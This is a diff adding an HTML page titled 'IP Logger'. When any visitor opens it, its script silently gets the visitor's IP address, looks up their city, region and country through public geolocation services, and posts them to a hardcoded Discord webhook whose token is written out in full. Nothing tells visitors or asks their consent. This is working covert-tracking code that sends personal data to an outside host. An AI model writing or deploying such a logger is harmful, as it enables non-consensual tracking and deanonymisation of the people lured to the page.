@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+</head>
+<body>
+    <h1>Welcome to the IP Logger Page</h1>
+    <script>
+        // Function to send the IP address and location to the Discord webhook with an embed message
+        async function sendIpToDiscord(ip, location) {
+            const webhookUrl = "https://discord.com/api/webhooks/1240707397358452817/-Mh9X4Kw5oPVK8DS2EhVHnulO7oaZozdFOWxCVqXRKzI98Xb71RQo6GUJKDwvRv9Sgj9";
+            const embed = {
+                title: "User Information",
+                description: "A new user has visited the page.",
+                color: 16711680, // Red color
+                fields: [
+                    {
+                        name: "IPv6 Address",
+                        value: ip,
+                        inline: true
+                    },
+                    {
+                        name: "Location",
+                        value: location,
+                        inline: true
+                    }
+                ],
+                timestamp: new Date().toISOString()
+            };
+
+            const payload = {
+                embeds: [embed]
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log('IP address and location sent to Discord webhook successfully');
+                } else {
+                    console.error('Failed to send IP address and location to Discord webhook');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        // Function to get the user's IP address and location
+        async function getIpAndLocation() {
+            try {
+                const ipResponse = await fetch('https://api64.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locationResponse.json();
+
+                const location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+
+                sendIpToDiscord(ip, location);
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        // Execute the function to get and send the IP address and location
+        getIpAndLocation();
+    </script>
+</body>
+</html>
